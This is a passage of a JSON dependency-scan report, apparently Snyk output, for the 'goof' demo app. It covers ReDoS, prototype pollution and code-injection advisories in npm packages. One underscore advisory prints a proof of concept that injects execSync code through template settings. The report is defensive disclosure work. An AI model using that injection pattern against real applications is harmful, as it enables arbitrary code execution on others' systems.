\"typeorm@0.2.24\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"typeorm@0.2.25\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"typeorm\",\n  \"version\": \"0.2.24\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1333"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-UGLIFYJS-1727251",
          "desc": "## Overview\n[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `uglify-js` to version 3.14.3 or higher.\n## References\n- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)\n- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-09-30T14:25:50.130236Z\",\n  \"credit\": [\n    \"ready-research\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `uglify-js` to version 3.14.3 or higher.\\n## References\\n- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)\\n- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)\\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)\\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)\\n\",\n  \"disclosureTime\": \"2021-09-30T14:22:21Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"3.14.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-UGLIFYJS-1727251\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1333\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-09T18:42:15.332622Z\",\n  \"moduleName\": \"uglify-js\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"uglify-js\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-11-09T18:42:15.313328Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/mishoo/UglifyJS/issues/5133\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/mishoo/UglifyJS/pull/5134\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/mishoo/UglifyJS/pull/5135\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.14.3\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\",\n    \"uglify-js@3.13.9\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\",\n    \"uglify-js@3.14.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"uglify-js\",\n  \"version\": \"3.13.9\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 , uglify-js@3.13.9 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 , uglify-js@2.8.29 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [
              "2021-23358"
            ],
            "ghsaid": [
              "cf4h-3jhx-xvhq"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Arbitrary Code Injection",
          "id": "SNYK-JS-UNDERSCORE-1080984",
          "desc": "## Overview\n[underscore](https://www.npmjs.org/package/underscore) is a JavaScript's functional programming helper library.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `template` function, particularly when the `variable` option is taken from `_.templateSettings` as it is not sanitized.\r\n\r\n### PoC\r\n```\r\nconst _ = require('underscore');\r\n_.templateSettings.variable = \"a = this.process.mainModule.require('child_process').execSync('touch HELLO')\";\r\nconst t = _.template(\"\")();\r\n```\n## Remediation\nUpgrade `underscore` to version 1.13.0-2, 1.12.1 or higher.\n## References\n- [GitHub Additional Information](https://github.com/jashkenas/underscore/blob/cb5f6fc6c2400649d942f1e36f9e5191fb7a1bf1/modules/template.js#L71)\n- [GitHub Commit](https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-03-02T19:52:38.855110Z\",\n  \"credit\": [\n    \"Alessio Della Libera (@d3lla)\"\n  ],\n  \"cvssScore\": 5.5,\n  \"description\": \"## Overview\\n[underscore](https://www.npmjs.org/package/underscore) is a JavaScript's functional programming helper library.\\n\\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `template` function, particularly when the `variable` option is taken from `_.templateSettings` as it is not sanitized.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nconst _ = require('underscore');\\r\\n_.templateSettings.variable = \\\"a = this.process.mainModule.require('child_process').execSync('touch HELLO')\\\";\\r\\nconst t = _.template(\\\"\\\")();\\r\\n```\\n## Remediation\\nUpgrade `underscore` to version 1.13.0-2, 1.12.1 or higher.\\n## References\\n- [GitHub Additional Information](https://github.com/jashkenas/underscore/blob/cb5f6fc6c2400649d942f1e36f9e5191fb7a1bf1/modules/template.js#L71)\\n- [GitHub Commit](https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66)\\n\",\n  \"disclosureTime\": \"2021-03-02T19:51:03Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"1.13.0-2\",\n    \"1.12.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-UNDERSCORE-1080984\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23358\"\n    ],\n    \"CWE\": [\n      \"CWE-94\"\n    ],\n    \"GHSA\": [\n      \"GHSA-cf4h-3jhx-xvhq\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-07-12T15:25:03.116440Z\",\n  \"moduleName\": \"underscore\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"underscore\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-03-29T14:54:59Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Additional Information\",\n      \"url\": \"https://github.com/jashkenas/underscore/blob/cb5f6fc6c2400649d942f1e36f9e5191fb7a1bf1/modules/template.js%23L71\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=1.13.0-0 <1.13.0-2\",\n      \">=1.3.2 <1.12.1\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Arbitrary Code Injection\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"cfenv@1.2.2\",\n    \"underscore@1.9.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"cfenv@1.2.4\",\n    \"underscore@1.12.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"underscore\",\n  \"version\": \"1.9.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , cfenv@1.2.2 , underscore@1.9.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-UNSETVALUE-2400660",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `unset-value` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)\n- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)\n- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)\n- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-02-13T14:46:07.185334Z\",\n  \"credit\": [\n    \"khizar\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `unset-value` to version 2.0.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)\\n- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)\\n- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)\\n- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)\\n\",\n  \"disclosureTime\": \"2022-02-13T14:44:04Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.0.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-UNSETVALUE-2400660\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-02-13T15:26:38.065734Z\",\n  \"moduleName\": \"unset-value\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"unset-value\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-02-13T15:26:38.063549Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/jonschlinkert/unset-value/issues/11\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jonschlinkert/unset-value/pull/12\"\n    },\n    {\n      \"title\": \"GitHub Release\",\n      \"url\": \"https://github.com/jonschlinkert/unset-value/releases\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.0.1\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"snapdragon@0.8.2\",\n    \"base@0.11.2\",\n    \"cache-base@1.0.1\",\n    \"unset-value@1.0.0\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"unset-value\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , unset-value@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-VALIDATOR-1090599",
